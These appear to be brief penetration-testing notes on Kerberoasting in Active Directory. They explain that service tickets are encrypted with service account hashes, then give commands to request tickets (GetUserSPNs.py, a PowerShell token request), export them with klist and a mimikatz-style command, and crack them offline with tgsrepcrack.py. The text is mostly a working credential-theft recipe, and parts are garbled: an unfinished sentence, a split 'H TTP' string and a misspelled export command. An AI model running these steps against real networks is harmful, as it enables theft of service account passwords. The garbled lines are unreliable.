# Kerberoasting
## Overview
We now know that the client requests a service ticket from the domain controller. Though, no checks are performed during that step to verify if the user has the correct permissions to access the ressource. These checks are only performed when the client connects to the service itself.

Most important, altough, the ticket always gets encrypted using the password hash of the service account. This means, that any user that has access to any service account password hash within the active directory network.

## One way
```
python GetUserSPNs.py domain/user -dc-ip <ip> -request
```

## Another way
Generating the ticket
```
PS C:\> Add-Type -AssemblyName System.IdentityModel  
New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList 'H TTP/CorpWebServer.corp.com'
```

Exporting the ticket
```
PS C:\> klist
PS C:\> kerberost::list /export
```

## Cracking the password
```
apt install kerberoast
python /usr/share/kerberoast/tgsrepcrack.py <wordlist> <TGS-file>
```
